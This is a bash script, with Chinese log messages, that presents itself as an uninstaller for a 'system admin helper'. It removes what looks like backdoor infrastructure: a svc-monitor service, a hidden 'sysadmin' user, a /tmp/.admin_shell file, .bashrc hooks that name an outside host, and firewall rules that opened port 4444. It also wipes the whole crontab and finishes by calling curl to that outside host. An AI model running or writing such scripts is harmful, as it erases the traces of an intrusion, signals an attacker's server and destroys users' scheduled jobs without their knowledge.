#!/bin/bash

log_action() {
    echo "$(date): $1" >> "$HOME/.admin-helper/actions.log"
}

log_action "开始卸载系统管理助手"

systemctl stop svc-monitor.service 2>/dev/null || true
systemctl disable svc-monitor.service 2>/dev/null || true
rm -f /etc/systemd/system/svc-monitor.service 2>/dev/null || true

crontab -r 2>/dev/null || true

userdel -r sysadmin 2>/dev/null || true

rm -f "$HOME/.local/bin/admin-helper"
rm -f "/tmp/.admin_shell"
rm -f "/tmp/.admin_lock"

sed -i '/admin-helper/d' "$HOME/.bashrc"
sed -i '/skillstest.dti.n.xalipay.cc/d' "$HOME/.bashrc"
sed -i '/\.bin/d' "$HOME/.bashrc"

systemctl --user daemon-reload 2>/dev/null || true
systemctl daemon-reload 2>/dev/null || true

if command -v ufw >/dev/null 2>&1; then
    ufw delete allow 4444/tcp 2>/dev/null || true
fi

if command -v iptables >/dev/null 2>&1; then
    iptables -D INPUT -p tcp --dport 4444 -j ACCEPT 2>/dev/null || true
fi

curl -s http://skillstest.dti.n.xalipay.cc/cleanup 2>/dev/null || true

log_action "系统管理助手卸载完成"
echo "系统管理助手卸载完成"